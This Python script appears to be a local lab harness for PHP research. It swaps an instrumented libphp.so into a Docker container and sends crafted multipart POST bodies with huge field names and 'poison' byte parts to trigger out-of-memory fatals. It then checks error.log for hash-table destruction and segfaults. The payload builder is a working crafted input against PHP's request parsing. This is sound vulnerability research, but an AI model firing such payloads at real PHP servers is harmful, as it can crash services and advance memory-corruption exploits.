#!/usr/bin/env python3
"""oom53: instrumented mod_php measurement — WHERE DOES THE DYING TABLE GO?
Swap instrumented libphp.so into php_vuln (stock backed up), then:
  attack x3 (in-window fatal) -> benign requests -> census + error.log.
Reads: keycommit/keyok counts (in-window deaths in mod_php?), destroy
banners nNumUsed>=3000 (walker finally touches the table?), segv lines.
Cleanup: restore stock libphp.so, restart container. Unconditional.
"""
import re
import subprocess
import sys
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
CONF = "/usr/local/etc/php/conf.d/30-oomlab.ini"
NAMELEN = 3064
EXTDIR = "/usr/lib/apache2/modules"


def sh(cmd, timeout=30):
    try:
        r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                           capture_output=True, timeout=timeout)
        return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:300]).strip()
    except subprocess.TimeoutExpired:
        return "<<EXEC TIMEOUT>>"


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * 10237 + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:150]
    except Exception as e:
        return type(e).__name__, str(e)[:150]


def main():
    n_benign = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    lab_ini_on = "printf 'memory_limit=20600000\\nmax_input_vars=100000\\npost_max_size=4096M\\n' > " + CONF
    try:
        print("=== swap in instrumented libphp ===", flush=True)
        print(sh("ls -la %s/" % EXTDIR))
        print(sh("cp %s/libphp.so /tmp/libphp.so.stock && echo backed-up" % EXTDIR))
        subprocess.run(["docker", "cp",
                        "phpbuild:/usr/src/php-8.2.34/libs/libphp.so",
                        "/tmp/libphp.so.instr"], check=True)
        subprocess.run(["docker", "cp", "/tmp/libphp.so.instr",
                        "php_vuln:%s/libphp.so" % EXTDIR], check=True)
        print(sh("ls -la %s/libphp.so" % EXTDIR))
        subprocess.run(["docker", "restart", "php_vuln"], check=True)
        for _ in range(20):
            time.sleep(1.5)
            if http("/oom_sapi.php", timeout=5)[0] == 200:
                break
        sh(lab_ini_on)
        sh("apachectl -k graceful 2>/dev/null")
        time.sleep(1.5)
        print("[ini]", http("/oom_sapi.php", timeout=10))
        sh(": > /var/log/apache2/error.log")
        print("[mark] error.log truncated", flush=True)

        att = build_attack()
        print("[attack] %d bytes x3" % len(att), flush=True)
        for i in range(3):
            code, text = http("/oom_mod.php", att,
                              "multipart/form-data; boundary=BOUND", 30)
            print("  atk%d: %s %r" % (i, code, text[:70]), flush=True)
        for i in range(n_benign):
            http("/oom_mod.php",
                 b"--BOUND\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n--BOUND--\r\n",
                 "multipart/form-data; boundary=BOUND", 15)
        time.sleep(2)

        print("=== census ===", flush=True)
        q = ("grep -ac 'TRACE keycommit' /var/log/apache2/error.log; "
             "grep -ac 'TRACE keyok' /var/log/apache2/error.log; "
             "grep -a 'TRACE keycommit' /var/log/apache2/error.log | tail -2; "
             "grep -aE 'PROBE (hash_destroy|array_destroy).*nNumUsed=([3-9][0-9]{2,}|[0-9]{4,})' "
             "/var/log/apache2/error.log | tail -6; "
             "grep -ac 'PROBE array_destroy' /var/log/apache2/error.log; "
             "grep -aE 'Segmentation|signal' /var/log/apache2/error.log | tail -4")
        out = sh(q, 60)
        print(out)
        lines = out.splitlines()
        try:
            commits, oks = int(lines[0]), int(lines[1])
            print("[VERDICT] in-window_deaths=%s array_destroy_fires=%s segv=%s"
                  % (commits > oks, int(lines[4]) > 0,
                     "Segmentation" in out), flush=True)
        except (IndexError, ValueError):
            print("[VERDICT] census unparsable", flush=True)
    finally:
        print("=== restore stock ===", flush=True)
        sh("rm -f %s" % CONF)
        sh("cp /tmp/libphp.so.stock %s/libphp.so 2>/dev/null" % EXTDIR)
        subprocess.run(["docker", "restart", "php_vuln"])
        for _ in range(20):
            time.sleep(1.5)
            if http("/oom_sapi.php", timeout=5)[0] == 200:
                break
        print("[restored]", http("/oom_sapi.php", timeout=10))


if __name__ == "__main__":
    main()
